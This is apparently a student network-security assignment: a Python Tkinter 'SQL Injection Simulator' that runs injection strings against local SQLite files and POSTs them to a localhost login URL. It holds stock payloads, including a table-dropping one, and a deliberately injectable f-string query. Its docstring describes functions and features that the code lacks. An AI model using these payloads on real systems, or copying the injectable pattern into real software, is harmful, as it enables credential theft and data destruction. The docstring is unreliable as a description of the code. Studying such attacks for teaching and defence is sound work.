"""
Python 3.13.2
Date: 2025-2-28 
Author: Clint and Constantine
CSCEA465 Network Security
Peer Learning Assignment: Team: Database B
  - Team Lead: Constantine
  - Offense Team: Constantine, Clint
  - Defense Team: Gwen, Nicasio

Offense Method: SQL Injection
This program simulates SQL injection attacks against a centralized database in a standalone, controlled environment.
It is designed for educational purposes to demonstrate how SQL injection works and how to prevent it.

Key Features:
  - SQL Injection Simulation: Allows users to simulate SQL injection attacks in a controlled environment.
  - Dynamic Query Input: Users can choose from default queries, manually input queries, or select from predefined queries.
  - User-Friendly Menu: Provides a clear and interactive menu for selecting attacks and viewing results.
  - Debugging Information: Displays detailed debug information for database connections and query execution.
  - Dynamic Programming: Precomputes and stores reusable data structures to optimize performance.
  - Centralized String Management: All prompts and messages are stored in the class body for easy modification and localization.
  - Enhanced User Interaction: 
    - Press {input_return} to return to the main menu at any time.
    - Press {input_quit} to quit the program entirely.
  - Database Flexibility: Supports multiple database types (e.g., SQLite3) via a dispatch dictionary.
  - New Attack Type: Added support for targeting Docker-hosted SQLite3 databases.

Key Classes and Functions:
  - SQLInjectionAttacks: Main class for managing SQL injection attacks.
    - get_user_credentials: Simulates an SQL injection attack to extract user credentials.
    - target_server: Simulates an SQL injection attack against a Docker-hosted SQLite3 database.
    - display_menu: Displays a formatted menu of available attacks and statistics.
    - get_user_choice: Prompts the user to select an attack by number or name.
    - get_query_input: Prompts the user to input a query or select from predefined options.
    - main_menu: Main loop for interacting with the user.
    - get_handle_query: Generalized handler for query input options (default, manual, predefined).
  - manage_db_connection: Manages database connections and executes attacks.
  - execute_attack: Executes the selected attack based on the attack ID and query.

Usage:
  - Run the script and follow the on-screen instructions to simulate SQL injection attacks.
  - Use the menu to select attacks, input queries, and view results.
  - Press {input_return} to return to the main menu or {input_quit} to quit the program at any time.

Notes:
  - This program is for educational purposes only and should not be used for malicious purposes.
  - Ensure the database file exists and is accessible before running attacks.
  - For Docker-hosted SQLite3 attacks, ensure the server is running and accessible.
"""
import sqlite3
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import requests

class SQLInjectionGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("SQL Injection Simulator")
        self.create_widgets()
        self.attack_type = tk.StringVar()
        self.db_type = tk.StringVar(value="users.db")
        self.url_visible = False

    def create_widgets(self):
        # Main container
        main_frame = ttk.Frame(self.root, padding="10")
        main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))

        # Attack type selection
        ttk.Label(main_frame, text="Select Attack Type:").grid(row=0, column=0, sticky=tk.W)
        self.attack_combobox = ttk.Combobox(main_frame, values=[
            "Extract User Credentials", 
            "Target Docker-Hosted SQLite3"
        ])
        self.attack_combobox.grid(row=0, column=1, sticky=tk.EW)
        self.attack_combobox.bind('<<ComboboxSelected>>', self.toggle_url_field)

        # Database selection
        ttk.Label(main_frame, text="Target Database:").grid(row=1, column=0, sticky=tk.W)
        self.db_combobox = ttk.Combobox(main_frame, values=["users.db", "users_secure.db"])
        self.db_combobox.set("users.db")
        self.db_combobox.grid(row=1, column=1, sticky=tk.EW)

        # URL input (hidden by default)
        self.url_frame = ttk.Frame(main_frame)
        ttk.Label(self.url_frame, text="Server URL:").grid(row=0, column=0, sticky=tk.W)
        self.url_entry = ttk.Entry(self.url_frame)
        self.url_entry.grid(row=0, column=1, sticky=tk.EW)
        self.url_entry.insert(0, "http://localhost:5000/login")
        self.url_frame.grid(row=2, column=0, columnspan=2, sticky=tk.EW)
        self.url_frame.grid_remove()

        # Query input
        ttk.Label(main_frame, text="Enter Query/Username:").grid(row=3, column=0, sticky=tk.W)
        self.query_entry = ttk.Entry(main_frame)
        self.query_entry.grid(row=3, column=1, sticky=tk.EW)
        self.query_entry.insert(0, "' OR '1'='1")

        # Predefined queries
        ttk.Label(main_frame, text="Predefined Queries:").grid(row=4, column=0, sticky=tk.W)
        self.query_combobox = ttk.Combobox(main_frame, values=[
            "' OR '1'='1",
            "admin' --",
            "'; DROP TABLE users; --"
        ])
        self.query_combobox.grid(row=4, column=1, sticky=tk.EW)
        self.query_combobox.bind('<<ComboboxSelected>>', self.update_query_entry)

        # Execute button
        self.execute_btn = ttk.Button(main_frame, text="Execute Attack", command=self.execute_attack)
        self.execute_btn.grid(row=5, column=0, columnspan=2, pady=10)

        # Results display
        self.results_area = scrolledtext.ScrolledText(main_frame, width=60, height=15)
        self.results_area.grid(row=6, column=0, columnspan=2, sticky=tk.EW)

        # Configure grid weights
        main_frame.columnconfigure(1, weight=1)

    def toggle_url_field(self, event=None):
        attack_type = self.attack_combobox.get()
        if "Docker" in attack_type:
            self.url_frame.grid()
            self.url_visible = True
        else:
            self.url_frame.grid_remove()
            self.url_visible = False

    def update_query_entry(self, event=None):
        self.query_entry.delete(0, tk.END)
        self.query_entry.insert(0, self.query_combobox.get())

    def display_results(self, message):
        self.results_area.insert(tk.END, message + "\n")
        self.results_area.see(tk.END)

    def execute_attack(self):
        attack_type = self.attack_combobox.get()
        db_file = self.db_combobox.get()
        query = self.query_entry.get()
        url = self.url_entry.get() if self.url_visible else ""

        self.display_results("\n=== Attack Parameters ===")
        self.display_results(f"Attack Type: {attack_type}")
        self.display_results(f"Target Database: {db_file}")
        self.display_results(f"Query: {query}")
        if self.url_visible:
            self.display_results(f"Target URL: {url}")

        try:
            if "Credentials" in attack_type:
                conn = sqlite3.connect(db_file)
                cursor = conn.cursor()
                probe_query = f"SELECT * FROM users WHERE username = '{query}'"
                cursor.execute(probe_query)
                results = cursor.fetchall()
                conn.close()

                if results:
                    self.display_results("\n=== Results ===")
                    for row in results:
                        self.display_results(str(row))
                else:
                    self.display_results("\nNo results found")
                
            elif "Docker" in attack_type:
                data = {"username": query, "password": "any"}
                response = requests.post(url, data=data)
                self.display_results("\n=== Server Response ===")
                self.display_results(f"Status Code: {response.status_code}")
                self.display_results(f"Response Content:\n{response.text}")

        except Exception as e:
            messagebox.showerror("Error", str(e))
            self.display_results(f"\nError: {str(e)}")

if __name__ == "__main__":
    root = tk.Tk()
    app = SQLInjectionGUI(root)
    root.mainloop()